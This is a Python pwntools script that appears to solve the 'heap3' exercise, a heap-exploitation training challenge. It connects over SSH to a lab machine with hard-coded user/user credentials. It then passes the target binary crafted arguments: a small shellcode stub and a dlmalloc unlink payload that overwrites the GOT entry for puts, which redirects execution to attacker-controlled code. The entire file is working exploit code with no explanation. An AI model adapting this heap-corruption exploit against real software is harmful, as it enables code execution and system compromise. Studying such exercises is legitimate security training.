
from pwn import *

from heaplib import HeapFrame


def main():
    e = ELF("./heap3")
    puts_got = e.got['puts']
    shellcode_address = 0x0804c00c

    shell = ssh(user="user", password="user", host="192.168.5.199", port=22)

    arg1 = "A"*4 + "\x68\x64\x88\x04\x08" + "\xc3"
    arg2, arg3 = HeapFrame("dlmalloc", puts_got, shellcode_address).get_exploit()
    arg2 = "A"*32 + arg2

    p = shell.run(["/home/user/heap3", arg1, arg2, arg3])
    print p.recvline()

if __name__ == '__main__':
    main()
